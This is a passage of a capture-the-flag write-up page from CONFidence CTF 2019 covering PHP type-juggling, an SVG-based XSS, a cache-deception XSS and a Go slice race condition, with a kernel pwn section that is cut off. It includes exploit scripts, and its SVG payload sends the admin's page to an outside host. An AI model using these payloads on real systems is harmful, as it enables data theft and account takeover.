@@ -1,0 +1,798 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>CONFidence CTF 2019</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#my-admin-panel">my-admin-panel</a>
+    
+                <a class="dropdown-item" href="#web-50">web-50</a>
+    
+                <a class="dropdown-item" href="#the-lottery">the-lottery</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#p4fmt">p4fmt</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#my-admin-panel" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">my-admin-panel</span>
+            </a>
+    
+<a href="#web-50" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">web-50</span>
+            </a>
+    
+<a href="#the-lottery" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">the-lottery</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#p4fmt" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">p4fmt</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="confidence-ctf-2019"><a class="header-link" href="#confidence-ctf-2019"></a>CONFidence CTF 2019</h1>
+
+<p>We got second place in CONFidence CTF 2019 with only one challenge left. Thanks to the organizer <a href="https://twitter.com/p4_team">p4</a> from Polish for such a great event! </p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="my-admin-panel"><a class="header-link" href="#my-admin-panel"></a>My admin panel</h3>
+<blockquote>
+<p>RB363</p>
+</blockquote>
+<p>This challenge is a simple PHP code review challange.</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">include</span> <span class="hljs-string">'../func.php'</span>;
+<span class="hljs-keyword">include</span> <span class="hljs-string">'../config.php'</span>;
+
+<span class="hljs-keyword">if</span> (!$_COOKIE[<span class="hljs-string">'otadmin'</span>]) {
+    <span class="hljs-keyword">exit</span>(<span class="hljs-string">"Not authenticated.\n"</span>);
+}
+
+<span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/^{"hash": [0-9A-Z\"]+}$/'</span>, $_COOKIE[<span class="hljs-string">'otadmin'</span>])) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>;
+    <span class="hljs-keyword">exit</span>();
+}
+
+$session_data = json_decode($_COOKIE[<span class="hljs-string">'otadmin'</span>], <span class="hljs-keyword">true</span>);
+
+<span class="hljs-keyword">if</span> ($session_data === <span class="hljs-keyword">NULL</span>) { <span class="hljs-keyword">echo</span> <span class="hljs-string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>; <span class="hljs-keyword">exit</span>(); }
+
+<span class="hljs-keyword">if</span> ($session_data[<span class="hljs-string">'hash'</span>] != strtoupper(MD5($cfg_pass))) {
+    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"I CAN EVEN GIVE YOU A HINT XD \n"</span>);
+
+    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; i &lt; strlen(MD5(<span class="hljs-string">'xDdddddd'</span>)); i++) {
+        <span class="hljs-keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="hljs-number">0xC0</span>);
+    }
+    <span class="hljs-keyword">exit</span>(<span class="hljs-string">"\n"</span>);
+}
+
+display_admin();</code></pre><p>From the source code above, we need to find a hash could pass the comparison between <code>$session_data[&#39;hash&#39;]</code> and <code>MD5($cfg_pass)</code></p>
+<p>And, when one of the operand is a string and the other one is a number, the operator <code>!=</code> in PHP would change string operand into to a number and the comparison performed numerically.</p>
+<p>e.g. <code>var_dump(100 == &quot;100abc&quot;); // 100 == 100 -&gt; true</code></p>
+<p>By this feature in PHP, we can try to input some number and bypass this comparison.</p>
+<p>Plus, I got a hint <code>0006464640640064000646464640006400640640646400</code> when I try to input something to test.</p>
+<p>From the hint, we know the string start with at most 3 continuous digit characters.</p>
+<p>Therefore, we just need to find a number from 0 to 999 could pass the comparison.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> requests
+
+hint = <span class="hljs-string">"0006464640640064000646464640006400640640646400"</span>
+limit = <span class="hljs-number">1000</span>
+url = <span class="hljs-string">"http://gameserver.zajebistyc.tf/admin/login.php"</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(limit):
+    cookies = dict(otadmin=<span class="hljs-string">'{"hash": '</span> + str(i) + <span class="hljs-string">'}'</span>)
+    sys.stdout.write(<span class="hljs-string">'\rTesting value: '</span> + str(i) + <span class="hljs-string">' of '</span> + str(limit))
+    sys.stdout.flush()
+
+    html = requests.get(url, cookies=cookies)
+    <span class="hljs-keyword">if</span> hint <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> html.text: 
+        <span class="hljs-keyword">break</span>
+
+print()
+print()
+print(html.text)</code></pre><p>With my script above, we can hit the md5 when <code>$session_data[&#39;hash&#39;]</code> is 389.</p>
+<p>And the flag is shown: </p>
+<pre class="hljs"><code><span class="hljs-symbol">Congratulations</span>! <span class="hljs-built_in">p4</span>{wtf_php_comparisons_how_do_they_work...}</code></pre><h3 id="web-50"><a class="header-link" href="#web-50"></a>Web 50</h3>
+<blockquote>
+<p>bookgin</p>
+</blockquote>
+<p>In this challenge we can edit our profile page, and report a link to admin. It&#39;s a classic XSS scenario.</p>
+<h4 id="solution-1:-xss-in-svg-image"><a class="header-link" href="#solution-1:-xss-in-svg-image"></a>Solution 1: XSS in SVG image</h4>
+<p>Based on the error page, the backend server is probably nginx + Flask(Python) + CloudFlare.</p>
+<p>In the profile page, we can upload an avatar to the server.  The server will check if this file is an valid image, and the size has to be 100x100. I rename a valid PNG image to <code>foo.html</code> and uploaded it. However the HTTP  content type is still <code>image/png</code>. The CloudFlare seems to <a href="https://community.cloudflare.com/t/cloudflare-is-changing-the-response-content-type/3152">overwrite the content-type</a> based on the content.</p>
+<p>Note if the content type is <code>image/png</code>, sending this link to admin will not trigger the XSS payload. The browser will simply render it as an image (or download it). So what if we upload a valid 100x100 image, but the CloudFlare fails to detect the content-type so that we can trigger the XSS payload?</p>
+<p>Since I don&#39;t know which library is used for determine the filetype and extract the size, I have to write a script to try all possible image format. I use <a href="https://imagemagick.org/script/formats.php#supported">imagemagick supported filetype</a> as a list to create lots of images with different formats.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests, glob
+<span class="hljs-keyword">import</span> secrets
+s = requests.session()
+r = s.post(<span class="hljs-string">'http://web50.zajebistyc.tf/login'</span>, data=dict(login=<span class="hljs-string">'laiph6Ieroh4iema'</span>,password=<span class="hljs-string">'laiph6Ieroh4iema'</span>))
+<span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> glob.glob(<span class="hljs-string">"file/*"</span>):
+    print(f)
+    filename = secrets.token_urlsafe(<span class="hljs-number">16</span>) + <span class="hljs-string">'.html'</span>
+    payload = open(f, <span class="hljs-string">'rb'</span>).read()
+    files = { 
+        <span class="hljs-string">'avatar'</span>: (filename, payload)
+    }   
+
+    r = s.post(<span class="hljs-string">'http://web50.zajebistyc.tf/profile/laiph6Ieroh4iema'</span>, files=files)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'not a valid image'</span> <span class="hljs-keyword">in</span> r.text[:<span class="hljs-number">150</span>]:
+        print(r.text)
+        <span class="hljs-keyword">continue</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'sorry, we only accept 100x100 images'</span> <span class="hljs-keyword">in</span> r.text[:<span class="hljs-number">150</span>]:
+        print(r.text)
+        <span class="hljs-keyword">continue</span>
+    url = <span class="hljs-string">'http://web50.zajebistyc.tf/avatar/62eee5152305547ff387eef08af028d340611ce15db259aeb714f6518328885b/'</span>+filename
+    print(url)
+    r = s.get(url)
+    print(r.headers[<span class="hljs-string">'Content-Type'</span>])</code></pre><p>Unfortunately, either the server said it&#39;s an invalid image, or CloudFlare can correctly determine the filetype.......</p>
+<pre class="hljs"><code><span class="hljs-built_in">image</span>/gif
+<span class="hljs-built_in">image</span>/jp2
+<span class="hljs-built_in">image</span>/jpeg
+<span class="hljs-built_in">image</span>/png
+<span class="hljs-built_in">image</span>/svg+xml
+<span class="hljs-built_in">image</span>/tiff
+<span class="hljs-built_in">image</span>/x-dpx
+<span class="hljs-built_in">image</span>/x-eps
+<span class="hljs-built_in">image</span>/x-exr
+<span class="hljs-built_in">image</span>/x-ms-bmp
+<span class="hljs-built_in">image</span>/x-pcx
+<span class="hljs-built_in">image</span>/x-portable-bitmap
+<span class="hljs-built_in">image</span>/x-portable-greymap
+<span class="hljs-built_in">image</span>/x-portable-pixmap
+<span class="hljs-built_in">image</span>/x-xpmi</code></pre><p>It seems that the server uses <a href="https://github.com/threatstack/libmagic/blob/1249b5cd02c3b6fb9b917d16c76bc76c862932b6/magic/Magdir/images#L298-L300">libmagic</a> to determine if it&#39;s a valid image. It&#39;s too difficult to bypass the server check and also make CloudFlare fail to detect the filetype.</p>
+<p>After I stuck here for several hours, I wonder what if I can trigger XSS but the content-type is still an image? The SVG is a great medium since it&#39;s basically a XML. After googling I found this <a href="http://xss.cx/xss.svg">PoC of SVG-based XSS</a>. The rest is starightforward.</p>
+<p>My exploit (thie file extension doesn&#39;t matter):</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests, glob
+<span class="hljs-keyword">import</span> secrets
+s = requests.session()
+r = s.post(<span class="hljs-string">'http://web50.zajebistyc.tf/login'</span>, data=dict(login=<span class="hljs-string">'laiph6Ieroh4iema'</span>,password=<span class="hljs-string">'laiph6Ieroh4iema'</span>))
+filename = secrets.token_urlsafe(<span class="hljs-number">16</span>) + <span class="hljs-string">'.html'</span>
+payload = <span class="hljs-string">'''&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
+&lt;svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve"&gt;  
+   &lt;script&gt;
+      fetch("http://web50.zajebistyc.tf/profile/admin").then(r =&gt; r.text()).then(t =&gt; fetch("//example.com/"+btoa(t)));
+   &lt;/script&gt;
+&lt;image id="image0" width="100" height="100" x="0" y="0"
+    href="" /&gt;
+&lt;/svg&gt;
+'''</span>
+files = {
+    <span class="hljs-string">'avatar'</span>: (filename, payload)
+}
+r = s.post(<span class="hljs-string">'http://web50.zajebistyc.tf/profile/laiph6Ieroh4iema'</span>, files=files)
+<span class="hljs-keyword">if</span> <span class="hljs-string">'not a valid image'</span> <span class="hljs-keyword">in</span> r.text[:<span class="hljs-number">150</span>]:
+    print(r.text)
+<span class="hljs-keyword">if</span> <span class="hljs-string">'sorry, we only accept 100x100 images'</span> <span class="hljs-keyword">in</span> r.text[:<span class="hljs-number">150</span>]:
+    print(r.text)
+url = <span class="hljs-string">'http://web50.zajebistyc.tf/avatar/62eee5152305547ff387eef08af028d340611ce15db259aeb714f6518328885b/'</span>+filename
+print(url)
+r = s.get(url)
+print(r.headers[<span class="hljs-string">'Content-Type'</span>])
+
+<span class="hljs-comment"># p4{15_1t_1m4g3_or_n0t?}</span></code></pre><h4 id="solution-2:-cache-poisoning"><a class="header-link" href="#solution-2:-cache-poisoning"></a>Solution 2: Cache Poisoning</h4>
+<p>This approach is mentioned in the IRC channel after the competition ends. Thanks to organizers <em>Rev`</em>, <em>Shalom</em>. The payload is credited to <em>toob</em>.</p>
+<p>In fact, in the profile &quot;edit&quot; page, we can insert arbitrary HTML attribute in the shoe size selection HTML tag. Though it filters <code>&lt;&gt;&quot;</code>, it can easily be bypassed using backtick.</p>
+<p>Changing the shoe size to this will pop up an alert screen:</p>
+<pre class="hljs"><code><span class="hljs-symbol">shoe size:</span>
+<span class="hljs-number">30</span> autofocus onfocus=alert`xss`
+
+<span class="hljs-symbol">HTML:</span>
+&lt;select name=<span class="hljs-string">"shoesize"</span> value=<span class="hljs-number">0</span> autofocus onfocus=`xss`&gt;</code></pre><p>We can use <code>eval</code> and <code>atob</code> to create a longer payload:</p>
+<pre class="hljs"><code><span class="hljs-symbol">0 </span>autofocus onfocus=eval(atob(`AAAAA`))</code></pre><p>However, the profile edit page can only be accessed by the user itself. The next problem is: how can we make admin visit this page? </p>
+<p>We use cache posoning. Here is an article explaining <a href="http://omergil.blogspot.com/2017/02/web-cache-deception-attack.html">cache poisoning attack by Omer Gil</a>. The link is credited <em>herrera_</em>. Thus we can use a special username like <code>foobar.css</code>, so <a href="https://support.cloudflare.com/hc/en-us/articles/200172516-Which-file-extensions-does-CloudFlare-cache-for-static-content-">cloudflare will cache them</a>. Then the admin will visit this cached page and become our XSS victim.</p>
+<p>Note that I solved this challenge using solution 1, so I didn&#39;t fully test this.</p>
+<h3 id="the-lottery"><a class="header-link" href="#the-lottery"></a>The Lottery</h3>
+<blockquote>
+<p>bookgin, sasdf</p>
+</blockquote>
+<p>In this challenge, we have the source code written in Go lang. In order to get flag, we have to achieve one of the two conditions.</p>
+<ol class="list">
+<li><code>isWinner()</code>: Each tick (5 seconds) the service will sum up the account&#39;s ammount and a random number. If it&#39;s equal to 0x133700, you get the flag.</li>
+<li><code>isMillionaire</code>: If the sum of user&#39;s amount is more than a million, you get the flag.</li>
+</ol>
+<pre class="hljs"><code>superUser := s.lottery.IsWinner(name) || account.IsMillionaire()
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Account)</span> <span class="hljs-title">IsMillionaire</span><span class="hljs-params">()</span> <span class="hljs-title">bool</span></span> {
+  sum := <span class="hljs-number">0</span>
+  <span class="hljs-keyword">for</span> _, a := <span class="hljs-keyword">range</span> a.Amounts {
+    sum += a
+  }
+  <span class="hljs-keyword">return</span> sum &gt;= <span class="hljs-number">1000000</span>                                                                                                
+}
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Account)</span> <span class="hljs-title">AddAmount</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">error</span></span> {
+  <span class="hljs-keyword">if</span> amount &lt; <span class="hljs-number">0</span> || amount &gt; <span class="hljs-number">99</span> {
+    <span class="hljs-keyword">return</span> errors.Wrapf(ErrInvalidData, <span class="hljs-string">"amount must be positive and less than %d: got '%d'"</span>, MaxAmount+<span class="hljs-number">1</span>, amount)
+  }
+  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a.Amounts) &gt;= <span class="hljs-number">4</span> {
+    <span class="hljs-keyword">return</span> errors.Wrapf(ErrInvalidData, <span class="hljs-string">"reached maximum number of amounts (%d)"</span>, MaxAmountsLen)
+  }
+  a.Amounts = <span class="hljs-built_in">append</span>(a.Amounts, amount)
+  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
+}
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(l *Lottery)</span> <span class="hljs-title">evaluate</span><span class="hljs-params">()</span></span> {
+  l.mutex.Lock()
+  <span class="hljs-keyword">defer</span> l.mutex.Unlock()
+  accounts := l.accounts
+  l.winners = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">struct</span>{})
+  l.accounts = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]Account)
+  <span class="hljs-keyword">for</span> name, account := <span class="hljs-keyword">range</span> accounts {
+    amounts := <span class="hljs-built_in">append</span>(account.Amounts, randInt(<span class="hljs-number">999913</span>, <span class="hljs-number">3700000</span>))
+    sum := <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> _, a := <span class="hljs-keyword">range</span> amounts {
+      sum += a
+    } 
+    <span class="hljs-keyword">if</span> sum == <span class="hljs-number">0x133700</span> {
+      l.winners[name] = <span class="hljs-keyword">struct</span>{}{}
+    } 
+  }                                                                                                                    
+}</code></pre><p>However, because the strict validation in the <code>AddAmount()</code>, it seems impossible to get the flag. What&#39;s worse, the random seed is based on <code>time.Now().UnixNano()</code>, which is pretty robust.</p>
+<p>Let&#39;s revisit the two condition again. If somehow we can make the big random number being appended into user&#39;s amount, we can make a millionaire! Also, there is RWmutex in the code; is it possible to achieve this with race condition?</p>
+<p>A quick search about golang append leads me <a href="https://medium.com/@cep21/gos-append-is-not-always-thread-safe-a3034db7975">this article</a>, which explains clearly that <code>append</code> in golang is not thread-safe. </p>
+<p>Here is a simple PoC:</p>
+<pre class="hljs"><code><span class="hljs-keyword">package</span> main
+
+<span class="hljs-keyword">import</span> (
+    <span class="hljs-string">"sync"</span>
+    <span class="hljs-string">"fmt"</span>
+)
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Log</span><span class="hljs-params">(s []<span class="hljs-keyword">int</span>)</span></span> {
+    fmt.Printf(<span class="hljs-string">"len=%d cap=%d %v\n"</span>, <span class="hljs-built_in">len</span>(s), <span class="hljs-built_in">cap</span>(s), s)
+}
+
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
+    x := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>)
+    Log(x)
+
+    wg := sync.WaitGroup{}
+    wg.Add(<span class="hljs-number">2</span>)
+    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
+        <span class="hljs-keyword">defer</span> wg.Done()
+        y := <span class="hljs-built_in">append</span>(x, <span class="hljs-number">1</span>,<span class="hljs-number">2</span>)
+        Log(y)
+    }()
+    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
+        <span class="hljs-keyword">defer</span> wg.Done()
+        z := <span class="hljs-built_in">append</span>(x, <span class="hljs-number">3</span>,<span class="hljs-number">4</span>)
+        Log(z)
+    }()
+    wg.Wait()
+}</code></pre><p>Running a few times and you will get:</p>
+<pre class="hljs"><code>len=<span class="hljs-number">0</span> cap=<span class="hljs-number">8</span> []
+len=<span class="hljs-number">2</span> cap=<span class="hljs-number">8</span> [<span class="hljs-number">1</span> <span class="hljs-number">2</span>]
+len=<span class="hljs-number">2</span> cap=<span class="hljs-number">8</span> [<span class="hljs-number">1</span> <span class="hljs-number">2</span>]</code></pre><p>The underlying reason behind this is explained well in the article. Therefore the idea is straightforward now. The exploit steps:</p>
+<ol class="list">
+<li>Create a account and append 3 numbers such that the capacity of the array is 4.</li>
+<li>Add this account into the lottery.</li>
+<li>Append a new number <code>87</code> into the account.</li>
+<li>If the <code>evaluate()</code> is invoked at the same time, our number <code>87</code> will be replaced with this big random number.</li>
+<li>We become millionaires now!</li>
+</ol>
+<p>My exploit script:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests
+
+s = requests.session()
+
+url = <span class="hljs-string">'https://lottery.zajebistyc.tf'</span>
+
+names = []
+<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">999999</span>):
+    r = s.post(url + <span class="hljs-string">"/account"</span>).json()
+    name = r[<span class="hljs-string">'name'</span>]
+    names.append(name)
+    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):
+        r = s.post(url + f<span class="hljs-string">'/account/{name}/amount'</span>, json=dict(amount=<span class="hljs-number">99</span>))
+        <span class="hljs-comment">#print(r.text)</span>
+    r = s.get(url + f<span class="hljs-string">'/account/{name}'</span>)
+    <span class="hljs-comment">#print(r.text)</span>
+
+    r = s.post(url + f<span class="hljs-string">'/lottery/add'</span>, json=dict(accountName=name))
+    <span class="hljs-comment">#print(r.text)</span>
+
+    r = s.post(url + f<span class="hljs-string">'/account/{name}/amount'</span>, json=dict(amount=<span class="hljs-number">87</span>))
+    <span class="hljs-comment">#print(r.text)</span>
+    r = s.get(url + f<span class="hljs-string">'/account/{name}'</span>)
+    print(r.text)
+    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'log'</span>,<span class="hljs-string">'a'</span>) <span class="hljs-keyword">as</span> f:
+        print(r.text, file=f)</code></pre><p>After running for a few minutes, we got the juicy flag:</p>
+<pre class="hljs"><code>{<span class="hljs-attr">"account"</span>:{<span class="hljs-attr">"name"</span>:<span class="hljs-string">"TmkFbDtDIFyLjiCI"</span>,<span class="hljs-attr">"amounts"</span>:[<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">2042896</span>]},<span class="hljs-attr">"flag"</span>:<span class="hljs-string">"p4{fucking-go-slices.com}"</span>}</code></pre><h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<ul class="list">
+<li>RWlock: In the source code, when we use <code>AccountAddAmount</code> API, instead of a write lock, it uses a RLock (read lock). Thus it&#39;s possible to achieve race condition here. However I don&#39;t think it&#39;s useful.</li>
+</ul>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="p4fmt"><a class="header-link" href="#p4fmt"></a>p4fmt</h3>
+<blockquote>
+<p>yuawn, billy</p>
+<ul class="list">
+<li>The files<pre class="hljs"><code>.
+├── <span class="hljs-selector-tag">bzImage</span>
+├── <span class="hljs-selector-tag">initramfs</span><span class="hljs-selector-class">.cpio</span><span class="hljs-selector-class">.gz</span>
+└── <span class="hljs-selector-tag">run</span><span class="hljs-selector-class">.sh</span></code></pre></li>
+<li>run<span></span>.sh:
+<code>`</code>sh</li>
+</ul>
+</blockquote>
+<p>#!/bin/bash
+qemu-system-x86_64 -kernel ./bzImage \
+        -initrd ./initramfs.cpio.gz \
+        -nographic \
+        -append &quot;console=ttyS0&quot; \</p>
+<pre class="hljs"><code>Extract the content <span class="hljs-keyword">of</span> rootfs:
+```shell
+gunzip initramfs.cpio.gz &amp;&amp; cpio -idmv &lt; initramfs.cpio</code></pre><p>rootfs:</p>
+<pre class="hljs"><code>...
+├── bzImage
+├── dev
+├── etc
+│   └── passwd
+├── flag
+├── home
+│   └── pwn
+├── init
+├── p4fmt.ko
+├── <span class="hljs-keyword">proc</span>
+├──<span class="hljs-title"> run.sh</span>
+├──<span class="hljs-title"> sbin</span>
+├──<span class="hljs-title"> sys</span>
+├──<span class="hljs-title"> tmp</span>
+└──<span class="hljs-title"> usr</span>
+    ├──<span class="hljs-title"> bin</span>
+    └──<span class="hljs-title"> sbin</span>
+
+12<span class="hljs-title"> directories,</span> 399<span class="hljs-title"> files</span></code></pre><p>The <code>flag</code> and kernel module <code>p4fmt.ko</code> are placed in the root directory.</p>
+<pre class="hljs"><code>/ $ ls <span class="hljs-_">-l</span> flag
+-rw-------    1 root     0               28 Mar 15 21:38 flag</code></pre><p>Only root can read the flag, therefore our the goal is privilege escalation obviously.</p>
+<h4 id="p4fmt.ko"><a class="header-link" href="#p4fmt.ko"></a>p4fmt.ko</h4>
+<p>It&#39;s a simple kernel module:</p>
+<pre class="hljs"><code>__<span class="hljs-function">int64 <span class="hljs-title">load_p4_binary</span><span class="hljs-params">(linux_binprm *_bprm)</span></span>{
+  ...
+}
+__<span class="hljs-function">int64 <span class="hljs-title">p4fmt_init</span><span class="hljs-params">()</span>
+</span>{
